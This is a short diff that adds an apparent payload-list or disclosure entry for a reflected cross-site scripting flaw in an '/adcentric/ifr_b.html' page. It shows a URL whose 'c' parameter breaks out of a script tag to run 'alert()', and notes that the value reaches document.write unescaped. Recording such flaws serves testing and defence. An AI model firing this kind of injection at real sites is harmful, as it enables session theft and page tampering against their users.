@@ -1,0 +1,3 @@
+/adcentric/ifr_b.html?c="></script><script>alert();</script>
+
+Simple injection via the param "c" that is used unescaped on the document.write.
